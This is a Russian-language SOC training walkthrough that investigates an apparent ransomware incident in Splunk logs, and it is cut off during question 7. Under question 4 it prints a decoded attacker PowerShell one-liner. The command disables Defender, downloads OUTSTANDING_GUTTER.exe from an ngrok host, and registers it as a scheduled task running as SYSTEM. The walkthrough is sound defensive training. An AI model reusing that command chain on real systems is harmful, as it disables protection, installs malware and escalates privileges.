Тренировочные задания хороши тем, что указывают направление поиска ответов, тем самым дают понимание того, какие децтвия должны быть предприняты в реальных условиях
Это своего рода вакцина - вроде все наглядно, но в тоже время все выглядит достаточно просто

Данное практическое задание будет максимально приближено к реальным условиям
Т.е. не будет сказано с какой базой данных работать, а вопросы будут гораздо труднее
Но это в свою очередь даст ощущения как себя вести в условия приближеных в "боевым"

Итак, начнем......

=====================================================================

Сценарий:   Вы аналитик SOC в компании MSSP (Managed Security Service Provider) под названием TryNotHackMe.
            Клиент отправил электронное письмо с просьбой пригласить аналитика для расследования событий, произошедших на машине Кигана в понедельник, 16 мая 2022 года.
            Клиент отметил, что машина работает, но некоторые файлы имеют странное расширение.
            Клиент обеспокоен тем, что на устройстве пользователя Киган была предпринята попытка вымогательства.

Задание:    Ваш менеджер поручил вам проверить события в Splunk, чтобы определить, что произошло на устройстве Кигана.

---------------------------------------------------------------------
* INTRO *
*********
Как правило (в реальных случаях) вам предоставляют не выжимку из логов, а сборную солянку - события, собранные со всех возмоных "даичков"
Поэтому сперва придется определить - с чем мы имеем дело (какие логи есть у нас)

В Splunk это можно сделать 2 способами:
*** Но сперва мы должны выбрать "Verbose Mode" (в качестве способа просмотра логов) и "All Times" (ну или люой другой диапозов в качестве исследуемого временого промежутка)

    1)  Выбрать наиболее подходящий/интересный сборник логов, через "Data Summary"
            Search&Reporting -> Mode&TimeFrame Selection -> Data Summary (in "How to Search" pane) -> sourcetype
    
    2)  Либо работать со всеми журнала одновременно
        Для этого используется символ Wildcard ("*") в строке поиска
        А после загрузки все событий (со всех журналов), мы можем выбирать, в одноименном поле (sourcetype), нужный нам журнал

После того, как мы определились со способом взаимодетсвия с журналами, крайне важно добавить дополнителные поля, который могут нам пригодиться в дальнейшем
*** Вообще, добавление необходимых полей - очень хорошая практика, так как по умолчанию Вам предоставляется стандартный набор
    Кроме того, не все поля отображаются в списке  "Interested Fileds".
    Дополнительные поля могут быть добавлены через ссылку в конце спика "interested Fields"
    Так что, после каждой процедуры выборки (почти после каждой) оекомендуется проверять ссылку на наличие возможности добавлять другие поля
*** Более того, каждый журнал ограничен в списке полей
    Так что предпочтительнее работать со всеми журнала одновременно
Наиболее востребоваными являются следующие поля (помимо стандартных):

    -   CommandLine
    -   Description
    -   DestinationIp
    -   DestinationPort
    -   Details
    -   EventCode
    -   eventtype
    -   File_Path
    -   Hashes
    -   Image
    -   ImageLoaded
    -   Message
    -   OperationalFilename
    -   ParentCommandLine
    -   ParentImage
    -   ProcessName
    -   Protocol
    -   QueryName
    -   QueryResults
    -   SourceIp
    -   SourcePort
    -   TargetFilename
    -   TargetImage
    -   TaskCategory
    -   User

Как только мы определились с нужными нам полями, самое время пройтись по списку "Selected Fields" и просмотреть какую информацию они нам предоставляют
Это так называемый - Пред-Просмотр, который может дать нам общее представление о происходящих событиях
К примеру:
    -   IP address & Ports, к которым было наибольшее/наименьшее количество обращений (это может указывать на возможные адреса скачивания вредоносных фалов и/или С2 сервера)
    -   Загруженные файлы
    -   События Sysmon/EvenViewer
    -   Используемые команды
    -   Содержание (message) пакетов
    -   и многое Другое

Ну, что - приступим к ответам на вопросы.....

---------------------------------------------------------------------
Ответим сразу на несколько вопросов:

1)  A suspicious binary was downloaded to the endpoint. What was the name of the binary?
    На конечную точку был загружен подозрительный двоичный файл. Каково было имя двоичного файла?

2)  What is the address the binary was downloaded from? Add http:// to your answer & defang the URL.
    С какого адреса был загружен двоичный файл? Добавьте http:// к вашему ответу и удалите URL.

3)  What Windows executable was used to download the suspicious binary? Enter full path.
    Какой исполняемый файл Windows использовался для загрузки подозрительного двоичного файла? Введите полный путь.

4)  What command was executed to configure the suspicious binary to run with elevated privileges?
    Какая команда была выполнена для настройки подозрительного двоичного файла на запуск с повышенными привилегиями?


Мы конечно может сразу предположить/угадать, что это был за файл, но нам надо собрать и затем предоставить доказательства
Начнем с полей, которые имеют относительно небольше колчество откликов

    a)  Сперва просмотрим Destination IP address & Ports, к которым было наибольшее количество запросов

        Destination IP addresses
            Top Values 	        Count 	    %
            3.17.7.232 	        208 	    69.103% 	
            3.14.182.203 	    76 	        25.249% 	
            3.134.125.175 	    4 	        1.329% 	
            ...SNIP...

        Destination Ports
            Top Values 	    Count 	    %
            443 	        296 	    98.339% 	
            80 	            4 	        1.329% 	
            445 	        1 	        0.332%
            ...SNIP...	
    
    b)  Затем можно просмотреть каждый из наиболее заинтресовавшиз нас IP address & Port, для обнаружения одинаковых событий/моментов/файлов/процессов
        Для поиска одинаковых событий/моментов/файлов/процессов чаще всего проверяют следующие поля на совпадения

            -   EventCode
            -   Images
            -   Messages
        
        В нашем случае были обнаружены совпадения по IP адресам 3.###.###.### и Ports 80 & 443 в следующих полях

            -   EventCode   =   3 (Network connection detected)
            -   Image:
                    C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
                    C:\Windows\Temp\OUTSTANDING_GUTTER.exe
            -   Protocol    =   tcp
        
        Детальное изучение EventCode и Protocol нам не даст каких-либо дополнительных подсказок
        Поэтому просмотрим совпадения по полю Images
    
    c)  Для этого в строке поиска после "*" будем поочердено указывать powershell и OUTSTANDING_GUTTER
        На этот раз. мы будем проверять совпадение по полям

            -   CommandLine
            -   Description
            -   Image
        
        Итак, что мы обнаружили

            -   CommandLine:
                    C:\Windows\system32\schtasks.exe /Create /TN OUTSTANDING_GUTTER.exe /TR C:\Windows\Temp\COUTSTANDING_GUTTER.exe /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU SYSTEM /f 	
                    C:\Windows\system32\schtasks.exe /Run /TN OUTSTANDING_GUTTER.exe	
                    C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoExit -Command [Console]::OutputEncoding=[Text.UTF8Encoding]::UTF8	
                    C:\Windows\Temp\OUTSTANDING_GUTTER.exe
            -   Description:
                    Task Scheduler Configuration Tool
                    Windows PowerShell	
            -   Image:
                    C:\Windows\Temp\OUTSTANDING_GUTTER.exe 	
                    C:\Windows\system32\svchost.exe 	
                    C:\Windows\System32\schtasks.exe 	
                    C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
                    C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2203.5-0\MsMpEng.exe

        Но также, наще внимание привлекли еще два нюанса, когда мы анализировали записи связанные с powershell

            i)  Было обращение к планировщику собрытий (tasksched)
            ii) Использовния зашифрованной строки с применением Base64 и ключа обхода -bypass
        
        Самое время изучить эту комнду более детально
    
    d)  Нажимаем на нее, чтобы она отобразилась в строке поиска и нам было удобно скопировать защифрованную строку для дешифровки в CyberChef
        Для дешивфроки в CyberChef используем следубщие фильтры

            -   From Base64
            -   Remove null bytes
        
        На выходе мы получаем следующую информацию (она идет одной строкой, но я перенс для удобства чтения)

            Set-MpPreference -DisableRealtimeMonitoring $true;wget http://886e-181-215-214-32.ngrok.io/OUTSTANDING_GUTTER.exe
            -OutFile C:\Windows\Temp\OUTSTANDING_GUTTER.exe;SCHTASKS /Create /TN "OUTSTANDING_GUTTER.exe" /TR
            "C:\Windows\Temp\COUTSTANDING_GUTTER.exe" /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU "SYSTEM" /f;SCHTASKS /Run /TN "OUTSTANDING_GUTTER.exe
        
        Что мы видим:

            -   Вредоносный файл - OUTSTANDING_GUTTER.exe
            -   Был скачен с использование команды wget с сайта - wget http://886e-181-215-214-32.ngrok.io
            -   Сохранен в - C:\Windows\Temp\OUTSTANDING_GUTTER.exe
            -   Создано запланированное событие с повышенными привелегиями - SCHTASKS /Create /TN "OUTSTANDING_GUTTER.exe" /TR "C:\Windows\Temp\COUTSTANDING_GUTTER.exe" /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU "SYSTEM" /f;SCHTASKS /Run /TN "OUTSTANDING_GUTTER.exe

5)  What permissions will the suspicious binary run as? What was the command to run the binary with elevated privileges? (Format: User + ; + CommandLine)
    С какими разрешениями будет запущен подозрительный двоичный файл? Какая была команда для запуска двоичного файла с повышенными привилегиями? (Формат: User + ; + CommandLine)

    В комнде на создание и запуск запланированного события был указан уровень привелегий - SYSTEM
    Но в ответе нам надо полностью указать имя пользователя и используемую комнаду

    Полное название пользователя мы можем найти в поле "Users" (при этом в строке фильтра должно быть только "* powershell")
        NT AUTHORITY\SYSTEM

    А комнаду в поле "CommandLine". которая указывает только на запуск запланированного события
        C:\Windows\system32\schtasks.exe" /Run /TN OUTSTANDING_GUTTER.exe

6)  The suspicious binary connected to a remote server. What address did it connect to? Add http:// to your answer & defang the URL.
    Подозрительный двоичный файл подключился к удаленному серверу. К какому адресу он подключился? Добавьте http:// к вашему ответу и отключите URL.

    Тут нам надо определить название веб-сервера, к оторому подклчался вредоносный файл, для создания С2 канала связи
    Если вопрос заключается в обнаружение названия веб-сервера, то зачастую дело обстоит с DNS запросами
    В таком слечае нам понадобатся поля
    *** Но сперва обнулим строку филтрации до первоналачльно значения, оставив только лишь wildcard символ ("*") и название вредоносного файла (OUTSTANDING_GUTTER.exe)

        -   QueryName
        -   QueryResults
        -   TaskCategory
    
    В поле TaskCategory выбираем ("Dns query (rule: DnsQuery)")
    И в одновленных результах проверям поле ("QueryName")
    
    В нашем случае мы имеем только одну запись - 9030-181-215-214-32.ngrok.io
    Хотя записей может быть несколько

    И тут мы наблюдаем один интересный факт - название домена откуда был скачан вредоносный файл и название домена С2 сервера совпадают (ngrok.io)

7)  A PowerShell script was downloaded to the same location as the suspicious binary. What was the name of the file?
    Скрипт PowerShell был загружен в то же место, что и подозрительный двоичный файл. Каково было имя файла?

    В нашем случае нам даль 2 подсказки

        i)  Файл был скачан в ту же папку, что и основной вредоносный файл OUTSTANDING_GUTTER
        ii) Это Powershell скрипт. Значит будет иметь расширение *.ps1 (в большинстве случаев)
    
    Однако в реальной жизни мы не будем иметь таких подсказок
    И едениственно, на что мы можем опираться (согласно обнаруженной информации) то, что файл мог быть скачан в туже самую папку - C:\Windows\Temp
    Более того, он скорее всего был таке скачан посредством powershell (как и основной файл)

    Используя все это мы обновим нашу строку фильрации до следующего значения
    *** Если в строке фильрации указывается путь к какому-либо каталог, то "косые" (\) дублируются (\\)

        * powershell C:\\Windows\\Temp
    
    И добавляем поле Hashes

    У нас конечно может быть много результатов, но используя полученные хеши и базу данных Virustotal, мы можем проверить их все на предмет совпадения
    












        